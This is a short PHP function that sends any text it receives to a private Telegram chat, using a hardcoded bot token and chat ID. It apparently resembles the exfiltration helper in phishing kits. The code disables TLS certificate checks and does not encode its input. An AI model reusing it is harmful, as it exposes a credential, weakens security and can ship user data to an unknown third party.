<?php

function telegram_send($Ak47) {
    $curl = curl_init();
    $api_key  = '5562826017:AAHCWSE5bco0GmItB14Cg4QEd-5NFM949yY';
    $chat_id  = '1499299449';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $Ak47 .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

?>